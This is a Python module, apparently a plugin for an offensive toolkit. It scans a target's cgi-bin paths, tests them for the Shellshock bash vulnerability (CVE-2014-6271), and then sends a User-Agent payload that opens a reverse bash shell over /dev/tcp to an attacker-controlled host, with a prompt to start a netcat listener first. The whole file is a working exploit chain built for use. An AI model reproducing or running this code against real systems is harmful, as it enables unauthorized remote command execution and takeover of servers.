def run(data, cred, args):
    import requests
    import time
    import sys
    from core.target import get_current_url
    from core.attacker import resolve_lhost

    # --- CORE PALETTE ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD, DIM = '\033[1m', '\033[2m'

    target = get_current_url(data)
    lhost = resolve_lhost(args)
    lport = 4444

    if not target:
        print(f"{R}[!] PHASE: ABORTED. Target URL missing.{W}")
        return data

    if not target.startswith("http"): target = f"http://{target}"

    # 1. PHASE HEADER & RECON
    print(f"\n{B}[*]{W} {BOLD}PHASE: SHELLSHOCK ENUMERATION{W}")
    print(f"{B}  ├── {B}Target:{W}   {C}{target}{W}")
    print(f"{B}  └── {B}Vector:{W}   {W}CGI-BIN Directory Brute{W}")

    paths = ["access.cgi", "test.cgi", "admin.cgi", "status.cgi", "info.cgi", "shell.cgi"]
    found = []

    print(f"\n{B}[*]{W} Scanning for CGI endpoints...")
    for p in paths:
        url = f"{target}/cgi-bin/{p}"
        try:
            r = requests.get(url, timeout=3)
            if r.status_code in [200, 403]: # Even 403s might be shellshockable
                print(f"{B}  ├── {G}FOUND:{W} {url}")
                found.append(url)
        except: continue

    if not found:
        print(f"{R}  └── {W}No CGI endpoints detected. Operation cancelled.")
        return data

    # 2. VULNERABILITY VERIFICATION
    print(f"\n{B}[*]{W} Testing for CVE-2014-6271...")
    vulnerable = None
    for url in found:
        headers = {"User-Agent": "() { :; }; echo; echo VULN_FOUND; /usr/bin/id"}
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if "VULN_FOUND" in r.text or "uid=" in r.text:
                vulnerable = url
                # THE LOOT BOX (VULN CONFIRMED)
                print(f"\n{G}┌── TARGET VULNERABLE ─────────────────────────────────────┐{W}")
                print(f"{G}│{W}  {G}URL:{W}    {BOLD}{url}{W: <38} {G}│{W}")
                print(f"{G}│{W}  {G}EXEC:{W}   {C}{r.text.strip().splitlines()[0][:38]}{W: <38} {G}│{W}")
                print(f"{G}└──────────────────────────────────────────────────────────┘{W}")
                break
        except: continue

    if not vulnerable:
        print(f"{R}[!] Scan complete. No vulnerable vectors identified.{W}")
        return data

    # 3. PRE-EXPLOIT ALERT
    print(f"\n{Y}┌── LISTENER REQUIRED ─────────────────────────────────────┐{W}")
    print(f"{Y}│{W}  {BOLD}nc -lvnp {lport}{W: <48} {Y}│{W}")
    print(f"{Y}└──────────────────────────────────────────────────────────┘{W}")

    input(f"\n{BOLD}{B}[*] Press ENTER to trigger callback to {lhost}:{lport}...{W}")

    # 4. EXPLOIT & CALLBACK
    for i in range(3, 0, -1):
        sys.stdout.write(f"\r{R}[!] FIRING IN {i}... {W}")
        sys.stdout.flush()
        time.sleep(1)

    payload = f"() {{ :; }}; /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    headers = {"User-Agent": payload}

    print(f"\n\n{B}[*]{W} Sending payload: {Y}{payload}{W}")
    try:
        requests.get(vulnerable, headers=headers, timeout=2)
    except requests.exceptions.ReadTimeout:
        # We expect a timeout because the shell hangs the connection
        print(f"{G}[+] Connection established. Check your listener.{W}")
    except Exception as e:
        print(f"{R}[!] Exploit Failed: {e}{W}")

    print(f"\n{C}>> SESSION MANAGEMENT DELEGATED TO LISTENER.{W}\n")
    return data